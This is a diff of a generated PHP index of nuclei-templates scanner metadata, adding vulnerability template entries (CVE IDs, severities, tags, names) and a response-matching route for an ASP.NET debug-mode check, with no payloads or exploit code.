@@ -11,15 +11,15 @@ return array (
     'schema' => 1,
     'source' => 'projectdiscovery/nuclei-templates',
     'license' => 'MIT (c) 2025 ProjectDiscovery, Inc.',
-    'upstream_tag' => '2ec9141',
+    'upstream_tag' => '2ec91412',
     'upstream_sha' => '2ec914123864439c3618e7e9ae72d32d0eb56df7',
-    'source_tree' => 'fbd7e7a83d9363292a3cf63dbed044506e7c163ac428521036d60fb01e9e56fb',
+    'source_tree' => 'c979b477e0c2e6c4532a78a322da37a516998f9925036e346fb1d5080ba61c73',
     'templates_seen' => 11196,
-    'templates_in' => 6343,
-    'templates_indexed' => 6448,
-    'route_keys' => 5314,
-    'multi_bundle_keys' => 276,
-    'largest_bundle_count' => 1325,
+    'templates_in' => 6386,
+    'templates_indexed' => 6491,
+    'route_keys' => 5360,
+    'multi_bundle_keys' => 277,
+    'largest_bundle_count' => 1326,
     'persona_cap' => 
     array (
       'n' => 40,
@@ -28,10 +28,10 @@ return array (
       array (
         'GET /' => 
         array (
-          'bundles_before' => 1325,
+          'bundles_before' => 1326,
           'bundles_after' => 40,
           'implausible_dropped' => 15,
-          'detect_ids' => 1590,
+          'detect_ids' => 1596,
         ),
         'GET /index.php' => 
         array (
@@ -5555,6 +5555,23 @@ return array (
       ),
       'name' => 'Apache Tomcat JK Connect <=1.2.44 - Manager Access',
     ),
+    'CVE-2018-11776' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2018',
+        2 => 'packetstorm',
+        3 => 'apache',
+        4 => 'rce',
+        5 => 'struts',
+        6 => 'kev',
+        7 => 'vkev',
+        8 => 'vuln',
+      ),
+      'name' => 'Apache Struts2 S2-057 - Remote Code Execution',
+    ),
     'CVE-2018-12031' => 
     array (
       'sev' => 'critical',
@@ -6260,6 +6277,22 @@ return array (
         5 => 'chunked',
       ),
       'name' => 'Apache2 - Transfer-Encoding Chunked XSS',
+    ),
+    'CVE-2018-17153' => 
+    array (
+      'sev' => 'critical',
+      'tags' => 
+      array (
+        0 => 'cve2018',
+        1 => 'cve',
+        2 => 'packetstorm',
+        3 => 'auth-bypass',
+        4 => 'rce',
+        5 => 'wdcloud',
+        6 => 'western_digital',
+        7 => 'vuln',
+      ),
+      'name' => 'Western Digital MyCloud NAS - Authentication Bypass',
     ),
     'CVE-2018-17246' => 
     array (
@@ -8624,6 +8657,24 @@ return array (
       ),
       'name' => 'WordPress GraceMedia Media Player 1.0 - Local File Inclusion',
     ),
+    'CVE-2019-9621' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2019',
+        2 => 'zimbra',
+        3 => 'collaboration-server',
+        4 => 'oast',
+        5 => 'oob',
+        6 => 'xxe',
+        7 => 'kev',
+        8 => 'vkev',
+        9 => 'vuln',
+      ),
+      'name' => 'Zimbra Collaboration Suite - SSRF',
+    ),
     'CVE-2019-9632' => 
     array (
       'sev' => 'high',
@@ -9296,6 +9347,21 @@ return array (
       ),
       'name' => 'Artica Pandora FMS 7.44 - Remote Code Execution',
     ),
+    'CVE-2020-13886' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2020',
+        2 => 'intelbras',
+        3 => 'tip200',
+        4 => 'tip300',
+        5 => 'lfi',
+        6 => 'vuln',
+      ),
+      'name' => 'Intelbras TIP 200/200 LITE/300 - Local File Inclusion',
+    ),
     'CVE-2020-13927' => 
     array (
       'sev' => 'critical',
@@ -9500,6 +9566,22 @@ return array (
       ),
       'name' => 'Nette Framework - Remote Code Execution',
     ),
+    'CVE-2020-15415' => 
+    array (
+      'sev' => 'critical',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2020',
+        2 => 'draytek',
+        3 => 'rce',
+        4 => 'router',
+        5 => 'kev',
+        6 => 'vkev',
+        7 => 'vuln',
+      ),
+      'name' => 'DrayTek Vigor - Command Injection',
+    ),
     'CVE-2020-15500' => 
     array (
       'sev' => 'medium',
@@ -9587,6 +9669,21 @@ return array (
         6 => 'vuln',
       ),
       'name' => 'Cisco Unified IP Conference Station 7937G - Denial-of-Service',
+    ),
+    'CVE-2020-16846' => 
+    array (
+      'sev' => 'critical',
+      'tags' => 
+      array (
+        0 => 'cve2020',
+        1 => 'cve',
+        2 => 'vulhub',
+        3 => 'saltstack',
+        4 => 'kev',
+        5 => 'vkev',
+        6 => 'vuln',
+      ),
+      'name' => 'SaltStack <=3002 - Shell Injection',
     ),
     'CVE-2020-16952' => 
     array (
@@ -9961,6 +10058,22 @@ return array (
         6 => 'vuln',
       ),
       'name' => 'Mara CMS  7.5 - Cross-Site Scripting',
+    ),
+    'CVE-2020-24285' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2020',
+        2 => 'intelbras',
+        3 => 'telefone',
+        4 => 'tip200',
+        5 => 'exposure',
+        6 => 'lfi',
+        7 => 'vuln',
+      ),
+      'name' => 'INTELBRAS TELEFONE IP TIP200 60.61.75.22 - Local File Inclusion',
     ),
     'CVE-2020-24312' => 
     array (
@@ -17695,6 +17808,22 @@ return array (
       ),
       'name' => 'Jenkins Git <=4.11.3 - Missing Authorization',
     ),
+    'CVE-2022-36923' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2022',
+        2 => 'zoho',
+        3 => 'manageengine',
+        4 => 'opmanager',
+        5 => 'oputils',
+        6 => 'auth-bypass',
+        7 => 'vkev',
+      ),
+      'name' => 'Zoho ManageEngine - getUserAPIKey Authentication Bypass',
+    ),
     'CVE-2022-37122' => 
     array (
       'sev' => 'high',
@@ -19029,6 +19158,21 @@ return array (
       ),
       'name' => 'Securepoint UTM - Leaking Remote Memory Contents',
     ),
+    'CVE-2023-23063' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2023',
+        2 => 'cellinx',
+        3 => 'lfi',
+        4 => 'nvt',
+        5 => 'vkev',
+        6 => 'vuln',
+      ),
+      'name' => 'Cellinx NVT Web Server - Local File Disclosure',
+    ),
     'CVE-2023-2309' => 
     array (
       'sev' => 'medium',
@@ -20136,6 +20280,22 @@ return array (
         5 => 'vuln',
       ),
       'name' => 'POS Codekop v2.0 - Broken Authentication',
+    ),
+    'CVE-2023-3643' => 
+    array (
+      'sev' => 'critical',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2023',
+        2 => 'lfi',
+        3 => 'carel',
+        4 => 'boss-mini',
+        5 => 'ics',
+        6 => 'path-traversal',
+        7 => 'file-inclusion',
+      ),
+      'name' => 'CAREL Boss Mini <= 1.4.0 - Local File Inclusion',
     ),
     'CVE-2023-36845' => 
     array (
@@ -22028,6 +22188,22 @@ return array (
       ),
       'name' => 'LearnPress < 4.2.7.4 - Course Material - Information Disclosure',
     ),
+    'CVE-2024-12008' => 
+    array (
+      'sev' => 'medium',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2024',
+        2 => 'wordpress',
+        3 => 'wp',
+        4 => 'wp-plugin',
+        5 => 'w3-total-cache',
+        6 => 'exposure',
+        7 => 'logs',
+      ),
+      'name' => 'W3 Total Cache < 2.8.2 - Log File Exposure',
+    ),
     'CVE-2024-1208' => 
     array (
       'sev' => 'medium',
@@ -23498,6 +23674,20 @@ return array (
       ),
       'name' => 'Netis Wifi Router - Information Disclosure',
     ),
+    'CVE-2024-48766' => 
+    array (
+      'sev' => 'critical',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2024',
+        2 => 'netalertx',
+        3 => 'lfi',
+        4 => 'vkev',
+        5 => 'vuln',
+      ),
+      'name' => 'NetAlert X - Arbitary File Read',
+    ),
     'CVE-2024-4879' => 
     array (
       'sev' => 'critical',
@@ -23558,6 +23748,20 @@ return array (
         4 => 'exposure',
       ),
       'name' => 'ZimaOS <= v1.2.4 - Sensitive Information Disclosure',
+    ),
+    'CVE-2024-4956' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2024',
+        2 => 'nexus',
+        3 => 'lfi',
+        4 => 'sonatype',
+        5 => 'vuln',
+      ),
+      'name' => 'Sonatype Nexus Repository Manager 3 - Local File Inclusion',
     ),
     'CVE-2024-49757' => 
     array (
@@ -23851,6 +24055,22 @@ return array (
         4 => 'vuln',
       ),
       'name' => 'IceWarp Server 10.2.1 - Cross-Site Scripting',
+    ),
+    'CVE-2024-55457' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2024',
+        2 => 'lfi',
+        3 => 'mastersam',
+        4 => 'v11',
+        5 => 'adama',
+        6 => 'vkev',
+        7 => 'vuln',
+      ),
+      'name' => 'MasterSAM Star Gate v11 - Local File Inclusion',
     ),
     'CVE-2024-56159' => 
     array (
@@ -24155,6 +24375,23 @@ return array (
       ),
       'name' => 'W&B Weave Server - Remote Arbitrary File Leak',
     ),
+    'CVE-2024-7714' => 
+    array (
+      'sev' => 'medium',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2024',
+        2 => 'ays-chatgpt-assistant',
+        3 => 'wordpress',
+        4 => 'wp-plugin',
+        5 => 'wp',
+        6 => 'iac',
+        7 => 'vuln',
+        8 => 'ai',
+      ),
+      'name' => 'AI Assistant with ChatGPT by AYS <= 2.0.9 - Unauthenticated AJAX Calls',
+    ),
     'CVE-2024-7928' => 
     array (
       'sev' => 'medium',
@@ -24268,6 +24505,23 @@ return array (
         5 => 'vuln',
       ),
       'name' => 'Ivanti Cloud Services Appliance - Path Traversal',
+    ),
+    'CVE-2024-9047' => 
+    array (
+      'sev' => 'critical',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2024',
+        2 => 'wp',
+        3 => 'wordpress',
+        4 => 'wp-plugin',
+        5 => 'wp-file-upload',
+        6 => 'lfi',
+        7 => 'vkev',
+        8 => 'vuln',
+      ),
+      'name' => 'WordPress File Upload <= 4.24.11 - Arbitrary File Read',
     ),
     'CVE-2024-9362' => 
     array (
@@ -24547,6 +24801,21 @@ return array (
         5 => 'vkev',
       ),
       'name' => 'MPDV Mikrolab GmbH HYDRA X, MIP 2 & FEDRA 2 - Path Traversal',
+    ),
+    'CVE-2025-12139' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2025',
+        2 => 'wordpress',
+        3 => 'wp-plugin',
+        4 => 'exposure',
+        5 => 'token',
+        6 => 'google-drive',
+      ),
+      'name' => 'Integrate Google Drive <= 1.5.3 - Information Disclosure',
     ),
     'CVE-2025-12480' => 
     array (
@@ -24976,6 +25245,22 @@ return array (
         6 => 'kev',
       ),
       'name' => 'XWiki Platform - Remote Code Execution',
+    ),
+    'CVE-2025-24963' => 
+    array (
+      'sev' => 'medium',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2025',
+        2 => 'vitest',
+        3 => 'browser',
+        4 => 'mode',
+        5 => 'lfi',
+        6 => 'vuln',
+        7 => 'vkev',
+      ),
+      'name' => 'Vitest Browser Mode - Local File Read',
     ),
     'CVE-2025-25037' => 
     array (
@@ -25532,6 +25817,21 @@ return array (
       ),
       'name' => 'MeteoBridge <= 6.1 - Remote Code Execution',
     ),
+    'CVE-2025-4078' => 
+    array (
+      'sev' => 'medium',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2025',
+        2 => 'wangshen',
+        3 => 'lfi',
+        4 => 'traversal',
+        5 => 'vuln',
+        6 => 'vkev',
+      ),
+      'name' => 'Wangshen SecGate 3600 Path Traversal Vulnerability',
+    ),
     'CVE-2025-41393' => 
     array (
       'sev' => 'medium',
@@ -25809,6 +26109,18 @@ return array (
       ),
       'name' => 'Discourse OAuth Social Login - Cross-site Scripting',
     ),
+    'CVE-2025-49002' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2025',
+        2 => 'dataease',
+        3 => 'fit2cloud',
+      ),
+      'name' => 'DataEase - Remote Code Execution',
+    ),
     'CVE-2025-50578' => 
     array (
       'sev' => 'medium',
@@ -25923,6 +26235,21 @@ return array (
         7 => 'vuln',
       ),
       'name' => 'LaRecipe < 2.8.1 Remote Code Execution via SSTI',
+    ),
+    'CVE-2025-54123' => 
+    array (
+      'sev' => 'critical',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2025',
+        2 => 'hoverfly',
+        3 => 'rce',
+        4 => 'intrusive',
+        5 => 'vuln',
+        6 => 'vkev',
+      ),
+      'name' => 'Hoverfly <= 1.11.3 - Remote Code Execution',
     ),
     'CVE-2025-54236' => 
     array (
@@ -26895,6 +27222,20 @@ return array (
         5 => 'vkev',
       ),
       'name' => 'Nginx UI < 2.3.3 - Information Disclosure',
+    ),
+    'CVE-2026-27971' => 
+    array (
+      'sev' => 'critical',
+      'tags' => 
+      array (
+        0 => 'cve',
+        1 => 'cve2026',
+        2 => 'qwik',
+        3 => 'rce',
+        4 => 'deserialization',
+        5 => 'vkev',
+      ),
+      'name' => 'Qwik - Unauthenticated RCE via server$ Deserialization',
     ),
     'CVE-2026-28288' => 
     array (
@@ -44433,6 +44774,18 @@ return array (
       ),
       'name' => 'SentinelOne Management Console Login Panel - Detect',
     ),
+    'sentry-panel' => 
+    array (
+      'sev' => 'info',
+      'tags' => 
+      array (
+        0 => 'panel',
+        1 => 'sentry',
+        2 => 'login',
+        3 => 'discovery',
+      ),
+      'name' => 'Sentry Login Panel',
+    ),
     'sequoiadb-login' => 
     array (
       'sev' => 'info',
@@ -49087,6 +49440,20 @@ return array (
       ),
       'name' => 'vLLM OpenAI-Compatible API - Unauthenticated Exposure',
     ),
+    'weglot-api-key-exposure' => 
+    array (
+      'sev' => 'medium',
+      'tags' => 
+      array (
+        0 => 'exposure',
+        1 => 'weglot',
+        2 => 'api-key',
+        3 => 'secret',
+        4 => 'js',
+        5 => 'misconfig',
+      ),
+      'name' => 'Weglot API Key - Exposed',
+    ),
     'wsdl-api' => 
     array (
       'sev' => 'info',
@@ -49496,6 +49863,18 @@ return array (
       ),
       'name' => 'Test CGI Script - Detect',
     ),
+    'circleci-config' => 
+    array (
+      'sev' => 'medium',
+      'tags' => 
+      array (
+        0 => 'config',
+        1 => 'exposure',
+        2 => 'circleci',
+        3 => 'vuln',
+      ),
+      'name' => 'CircleCI Configuration File - Detect',
+    ),
     'circleci-ssh-config' => 
     array (
       'sev' => 'medium',
@@ -49744,6 +50123,18 @@ return array (
         3 => 'vuln',
       ),
       'name' => 'Django Config - Detect',
+    ),
+    'docker-compose-config' => 
+    array (
+      'sev' => 'medium',
+      'tags' => 
+      array (
+        0 => 'config',
+        1 => 'exposure',
+        2 => 'devops',
+        3 => 'vuln',
+      ),
+      'name' => 'Docker Compose - Detect',
     ),
     'dockercfg-config' => 
     array (
@@ -51015,6 +51406,17 @@ return array (
         3 => 'vuln',
       ),
       'name' => 'Redis Configuration File - Detect',
+    ),
+    'remote-spark-gateway-config' => 
+    array (
+      'sev' => 'medium',
+      'tags' => 
+      array (
+        0 => 'config',
+        1 => 'exposure',
+        2 => 'remote-spark',
+      ),
+      'name' => 'Remote Spark Gateway Configuration/Credentials - Exposure',
     ),
     'rexify-config-exposure' => 
     array (
@@ -54063,6 +54465,19 @@ return array (
       ),
       'name' => 'Discover wp-app.log Files',
     ),
+    'wp-easy-google-fonts-log-disclosure' => 
+    array (
+      'sev' => 'low',
+      'tags' => 
+      array (
+        0 => 'wordpress',
+        1 => 'wp-plugin',
+        2 => 'exposure',
+        3 => 'easy-google-fonts',
+        4 => 'logs',
+      ),
+      'name' => 'WordPress Easy Google Fonts - Error Log Disclosure',
+    ),
     'wp-enable-media-replace-log' => 
     array (
       'sev' => 'medium',
@@ -54090,6 +54505,43 @@ return array (
         5 => 'exposure',
       ),
       'name' => 'WordPress Flexible Shipping - Log File Exposure',
+    ),
+    'wp-importer-log-disclosure' => 
+    array (
+      'sev' => 'low',
+      'tags' => 
+      array (
+        0 => 'wordpress',
+        1 => 'wp-plugin',
+        2 => 'exposure',
+        3 => 'logs',
+      ),
+      'name' => 'WordPress Importer - Error Log Disclosure',
+    ),
+    'wp-newsletter-log-exposure' => 
+    array (
+      'sev' => 'medium',
+      'tags' => 
+      array (
+        0 => 'wordpress',
+        1 => 'wp-plugin',
+        2 => 'newsletter',
+        3 => 'logs',
+      ),
+      'name' => 'WordPress Newsletter - Log File Exposure',
+    ),
+    'wp-pretty-link-log-disclosure' => 
+    array (
+      'sev' => 'low',
+      'tags' => 
+      array (
+        0 => 'wordpress',
+        1 => 'wp-plugin',
+        2 => 'exposure',
+        3 => 'pretty-link',
+        4 => 'logs',
+      ),
+      'name' => 'WordPress Pretty Link - Error Log Disclosure',
     ),
     'wp-wps-hide-login-log' => 
     array (
@@ -55307,6 +55759,22 @@ return array (
         4 => 'vuln',
       ),
       'name' => 'Cloudflare Transform via URL - Image Injection',
+    ),
+    'crypto-address-detect' => 
+    array (
+      'sev' => 'info',
+      'tags' => 
+      array (
+        0 => 'crypto',
+        1 => 'bitcoin',
+        2 => 'monero',
+        3 => 'ethereum',
+        4 => 'xrp',
+        5 => 'ripple',
+        6 => 'osint',
+        7 => 'discovery',
+      ),
+      'name' => 'Exposed Cryptocurrency Wallet Address',
     ),
     'crypto-mining-malware' => 
     array (
@@ -56609,6 +57077,17 @@ return array (
         2 => 'vuln',
       ),
       'name' => 'Artifactory anonymous deploy',
+    ),
+    'aspx-debug-mode' => 
+    array (
+      'sev' => 'info',
+      'tags' => 
+      array (
+        0 => 'debug',
+        1 => 'misconfig',
+        2 => 'vuln',
+      ),
+      'name' => 'ASP.NET Debugging Enabled',
     ),
     'atlantis-dashboard' => 
     array (
@@ -66624,6 +67103,22 @@ return array (
         6 => 'exposure',
       ),
       'name' => 'WordPress Yoast SEO - Full Path Disclosure',
+    ),
+    'wp-gravity-forms-log-disclosure' => 
+    array (
+      'sev' => 'low',
+      'tags' => 
+      array (
+        0 => 'wordpress',
+        1 => 'wp',
+        2 => 'wp-plugin',
+        3 => 'gravityforms',
+        4 => 'log',
+        5 => 'disclosure',
+        6 => 'exposure',
+        7 => 'misconfig',
+      ),
+      'name' => 'WordPress Gravity Forms - Log File Disclosure',
     ),
     'wp-registration-enabled' => 
     array (
@@ -76653,6 +77148,21 @@ return array (
       ),
       'name' => 'WordPress Importer Detection',
     ),
+    'wordpress-plugin-detect' => 
+    array (
+      'sev' => 'info',
+      'tags' => 
+      array (
+        0 => 'tech',
+        1 => 'wp',
+        2 => 'wordpress',
+        3 => 'plugin',
+        4 => 'detection',
+        5 => 'wp-plugin',
+        6 => 'discovery',
+      ),
+      'name' => 'Wordpress Plugin Detection',
+    ),
     'wordpress-wordpress-seo' => 
     array (
       'sev' => 'info',
@@ -77055,6 +77565,21 @@ return array (
         4 => 'discovery',
       ),
       'name' => 'YITH WooCommerce Wishlist Detection',
+    ),
+    'wordpress-theme-detect' => 
+    array (
+      'sev' => 'info',
+      'tags' => 
+      array (
+        0 => 'tech',
+        1 => 'wp',
+        2 => 'wordpress',
+        3 => 'theme',
+        4 => 'detection',
+        5 => 'wp-theme',
+        6 => 'discovery',
+      ),
+      'name' => 'Wordpress Theme Detection',
     ),
     'wp-bricks-builder-theme' => 
     array (
@@ -77930,6 +78455,18 @@ return array (
       ),
       'name' => 'Gradio - Local File Inclusion',
     ),
+    'hcm-cloud-lfi' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'hcm-cloud',
+        1 => 'lfi',
+        2 => 'hcm',
+        3 => 'vuln',
+      ),
+      'name' => 'HCM Cloud - Arbitrary File Read',
+    ),
     'hikvision-isecure-info-leak' => 
     array (
       'sev' => 'high',
@@ -78742,6 +79279,18 @@ return array (
       ),
       'name' => 'Aishu AnyShare - Information Disclosure',
     ),
+    'alibaba-anyproxy-lfi' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'alibaba',
+        1 => 'anyproxy',
+        2 => 'lfi',
+        3 => 'vuln',
+      ),
+      'name' => 'Alibaba Anyproxy fetchBody File - Path Traversal',
+    ),
     'array-vpn-lfi' => 
     array (
       'sev' => 'high',
@@ -78981,6 +79530,18 @@ return array (
         1 => 'vuln',
       ),
       'name' => 'CouchDB Admin Default - Detect',
+    ),
+    'cpas-managment-lfi' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'cpas',
+        1 => 'cms',
+        2 => 'lfi',
+        3 => 'vuln',
+      ),
+      'name' => 'CPAS Management System - Arbitrary File Read',
     ),
     'crawlab-lfi' => 
     array (
@@ -81087,6 +81648,18 @@ return array (
       ),
       'name' => 'Webigniter 28.7.23 - Cross-Site Scripting',
     ),
+    'webp-server-lfi' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'webp',
+        1 => 'webp-server',
+        2 => 'lfi',
+        3 => 'vuln',
+      ),
+      'name' => 'Webp Server Go - Path Traversal',
+    ),
     'webui-rce' => 
     array (
       'sev' => 'critical',
@@ -81460,6 +82033,17 @@ return array (
         2 => 'vuln',
       ),
       'name' => 'Sangfor EDR 3.2.17R1/3.2.21 - Remote Code Execution',
+    ),
+    'sangfor-login-rce' => 
+    array (
+      'sev' => 'critical',
+      'tags' => 
+      array (
+        0 => 'sangfor',
+        1 => 'rce',
+        2 => 'vuln',
+      ),
+      'name' => 'Sangfor Application Login - Remote Command Execution',
     ),
     'sangfor-nextgen-lfi' => 
     array (
@@ -83153,6 +83737,20 @@ return array (
       ),
       'name' => 'WordPress license file disclosure',
     ),
+    'wp-mailchimp-log-exposure' => 
+    array (
+      'sev' => 'medium',
+      'tags' => 
+      array (
+        0 => 'wordpress',
+        1 => 'wp-plugin',
+        2 => 'mailchimp',
+        3 => 'mc4wp',
+        4 => 'exposure',
+        5 => 'logs',
+      ),
+      'name' => 'WordPress MC4WP - Debug Log Exposure',
+    ),
     'wp-mega-theme' => 
     array (
       'sev' => 'medium',
@@ -83765,6 +84363,18 @@ return array (
         3 => 'vuln',
       ),
       'name' => 'UFIDA NC Portal - Arbitrary File Read',
+    ),
+    'yonyou-yonbip-lfi' => 
+    array (
+      'sev' => 'high',
+      'tags' => 
+      array (
+        0 => 'yonyou',
+        1 => 'yonbip',
+        2 => 'lfi',
+        3 => 'vuln',
+      ),
+      'name' => 'YonBIP - Arbitrary File Read',
     ),
     'zend-v1-xss' => 
     array (
@@ -85035,6 +85645,44 @@ return array (
   ),
   'routes' => 
   array (
+    'DEBUG /Foobar-debug.aspx' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => 
+          array (
+            'eq' => 2,
+          ),
+          'rx' => 
+          array (
+            0 => 'OK',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => '',
+          'sev' => 'info',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'aspx-debug-mode',
+          ),
+          'x' => true,
+        ),
+      ),
+    ),
     'DELETE /dav/server.php/files/personal/GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021' => 
     array (
       'b' => 
@@ -85189,1483 +85837,1489 @@ return array (
         111 => 'CVE-2025-41393',
         112 => 'CVE-2025-46549',
         113 => 'CVE-2025-68602',
-        114 => 'CVE-2025-31131',
-        115 => 'CVE-2025-46349',
-        116 => 'CVE-2025-50578',
-        117 => 'CVE-2025-46550',
-        118 => 'yeswiki-reflected-xss',
-        119 => 'yeswiki-xss',
-        120 => 'yeswiki-detect',
-        121 => 'CVE-2026-3001',
-        122 => 'ace-admin-dashboard',
-        123 => 'amr-printer-management-unauth',
-        124 => 'ecosys-command-center',
-        125 => 'aspnet-soap-webservices-asmx',
-        126 => 'asus-wl520GU-default-login',
-        127 => 'asus-aicloud-panel',
-        128 => 'atlantis-dashboard',
-        129 => 'atlantis-detect',
-        130 => 'avtech-avn801-camera-panel',
-        131 => 'bitrix24-installer',
-        132 => 'bloofoxcms-login-panel',
-        133 => 'cacti-fpd',
-        134 => 'cacti-panel',
-        135 => 'canon-ir-adv',
-        136 => 'canon-c3325-unauth',
-        137 => 'cgit-detect',
-        138 => 'cgit-panel',
-        139 => 'chainlit-panel',
-        140 => 'ckan-dom-based-xss',
-        141 => 'clickhouse-unauth-api',
-        142 => 'codis-dashboard',
-        143 => 'coming-soon-page-detect',
-        144 => 'default-apache-miracle',
-        145 => 'couchdb-detect',
-        146 => 'couchdb-fauxton',
-        147 => 'deepstack-panel',
-        148 => 'deluge-webui-panel',
-        149 => 'dgraph-dashboard-exposure',
-        150 => 'dont-panic-traceback',
-        151 => 'doris-dashboard',
-        152 => 'dplus-dashboard',
-        153 => 'elastic-hd-dashboard',
-        154 => 'elastic-cloud-api-key',
-        155 => 'encompass-cm1-homepage',
-        156 => 'espeasy-mega-exposure',
-        157 => 'exposed-glances-api',
-        158 => 'unauthenticated-glances',
-        159 => 'express-default-page',
-        160 => 'ezservermonitor-exposure',
-        161 => 'facturascripts-installer',
-        162 => 'ffserver-status',
-        163 => 'fiftyone-panel',
-        164 => 'filebrowser-unauth',
-        165 => 'filebrowser-login-panel',
-        166 => 'flower-detect',
-        167 => 'form-detection',
-        168 => 'gcs-bucket-listing',
-        169 => 'gira-homeserver-homepage',
-        170 => 'gitea-installer',
-        171 => 'global-traffic-statistics',
-        172 => 'graylog-api-exposure',
-        173 => 'graylog-panel',
-        174 => 'h2o-dashboard',
-        175 => 'hfs-exposure',
-        176 => 'impresspages-installer',
-        177 => 'joomla-detect',
-        178 => 'joomla-marvikshop-xss',
-        179 => 'joomla-jlex-xss',
-        180 => 'jotform-api-key',
-        181 => 'klr300n-install',
-        182 => 'krpano-detect',
-        183 => 'kubernetes-web-view',
-        184 => 'kubernetes-enterprise-manager',
-        185 => 'kubernetes-resource-report',
-        186 => 'librespeed-panel',
-        187 => 'magnolia-installer',
-        188 => 'magnolia-panel',
-        189 => 'manageengine-opmanager',
-        190 => 'matomo-installer',
-        191 => 'matomo-panel',
-        192 => 'meddream-dicom-viewer-panel',
-        193 => 'microweber-install',
-        194 => 'microweber-detect',
-        195 => 'miniflux-panel',
-        196 => 'mistserver-installer',
-        197 => 'mobiproxy-dashboard',
-        198 => 'pgwatch2-db-exposure',
-        199 => 'kubernetes-dashboard',
-        200 => 'moleculer-microservices',
-        201 => 'neocase-hrportal-panel',
-        202 => 'netalertx-dashboard',
-        203 => 'netalertx-panel',
-        204 => 'nodebb-installer',
-        205 => 'ntop-panel-exposed',
-        206 => 'ntopng-traffic-dashboard',
-        207 => 'ntop-detect',
-        208 => 'odoo-panel',
-        209 => 'opcache-control-panel',
-        210 => 'openarchives-detect',
-        211 => 'orbeon-forms-exposure',
-        212 => 'owncloud-installer-exposure',
-        213 => 'pa11y-dashboard',
-        214 => 'pi-hole-panel',
-        215 => 'piwik-installer',
-        216 => 'qdpm-login-panel',
-        217 => 'questdb-console',
-        218 => 'qvidium-management-system-exposed',
-        219 => 'rcdevs-webadm-panel',
-        220 => 'sap-igs-detect',
-        221 => 'sap-cloud-analytics',
-        222 => 'sap-message-server-detect',
-        223 => 'sap-spartacus-detect',
-        224 => 'scan2net-panel',
-        225 => 'sdwebui-detect',
-        226 => 'seaweedfs-unauth',
-        227 => 'spring-eureka',
-        228 => 'springboot-actuator',
-        229 => 'springboot-x-application-context',
-        230 => 'sungrow-logger1000-detect',
-        231 => 'thinkcmf-lfi',
-        232 => 'thinkcmf-detection',
-        233 => 'tomcat-directory-listing',
-        234 => 'jkstatus-manager',
-        235 => 'tpot-honeypot-detect',
-        236 => 'unauth-kafka-config-editor',
-        237 => 'kafka-center-login',
-        238 => 'kafka-connect-ui',
-        239 => 'kafka-consumer-monitor',
-        240 => 'kafka-cruise-control',
-        241 => 'kafka-manager-panel',
-        242 => 'kafka-monitoring',
-        243 => 'unauth-apache-kafka-ui',
-        244 => 'unauth-supervisor-dashboard',
-        245 => 'unibox-panel',
-        246 => 'upnp-device-detect',
-        247 => 'vikunja-panel',
-        248 => 'vllm-api-detect',
-        249 => 'wiren-board-webui',
-        250 => 'wp-mega-theme',
-        251 => 'wp-real-estate-xss',
-        252 => 'CVE-2021-24387',
-        253 => 'wp-woocommerce-email-verification',
-        254 => 'CVE-2014-100004',
-        255 => 'CVE-2014-9444',
-        256 => 'CVE-2015-7377',
-        257 => 'CVE-2017-4011',
-        258 => 'CVE-2019-9955',
-        259 => 'CVE-2020-15500',
-        260 => 'tileserver-gl',
-        261 => 'CVE-2020-16952',
-        262 => 'CVE-2020-23517',
-        263 => 'highmail-admin-panel',
-        264 => 'CVE-2020-29047',
-        265 => 'CVE-2020-6171',
-        266 => 'CVE-2021-20086',
-        267 => 'CVE-2021-28918',
-        268 => 'CVE-2021-29625',
-        269 => 'CVE-2022-0150',
-        270 => 'CVE-2022-45836',
-        271 => 'CVE-2023-2813',
-        272 => 'CVE-2023-34598',
-        273 => 'CVE-2023-49293',
-        274 => 'CVE-2024-11740',
-        275 => 'CVE-2024-27954',
-        276 => 'wp-memphis-documents-library-lfi',
-        277 => 'CVE-2024-35694',
-        278 => 'CVE-2025-13339',
-        279 => 'CVE-2026-40878',
-        280 => 'abb-ability-genix-detect',
-        281 => 'accueil-wampserver',
-        282 => 'wampserver-homepage',
-        283 => 'acunetix-login',
-        284 => 'afterlogic-webmail-login',
-        285 => 'agent-zero-detect',
-        286 => 'aim-panel',
-        287 => 'airtame-device-detect',
-        288 => 'lexmark-detect',
-        289 => 'alibaba-mongoshake-unauth',
